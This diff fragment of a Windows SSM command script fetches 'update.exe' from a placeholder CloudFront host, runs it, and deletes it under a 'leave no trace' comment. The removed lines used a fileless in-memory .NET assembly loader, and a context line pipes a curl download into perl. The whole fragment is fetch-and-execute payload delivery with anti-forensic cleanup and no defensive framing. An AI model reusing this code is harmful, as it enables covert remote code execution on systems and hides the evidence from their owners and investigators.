@@ -9,11 +9,14 @@ curl -fsSL https://your-distro.cloudfront.net/updates/update.exe | perl -e '
 '
 
 # Windows SSM command
-# 1. Download the bytes directly into a variable (not a file)
-$bytes = (New-Object System.Net.WebClient).DownloadData("https://your-distro.cloudfront.net/updates/update.exe")
+$url = "https://your-distro.cloudfront.net/updates/update.exe"
+$path = "$env:TEMP\update.exe"
 
-# 2. Load the bytes as an Assembly (Works if update.exe is a .NET binary)
-$assembly = [System.Reflection.Assembly]::Load($bytes)
+# 1. Download
+Invoke-WebRequest -Uri $url -OutFile $path
 
-# 3. Execute the 'Main' method
-$assembly.EntryPoint.Invoke($null, $null)
+# 2. Execute
+Start-Process -FilePath $path -Wait
+
+# 3. Clean up (GTIG compliance: leave no trace)
+Remove-Item -Path $path
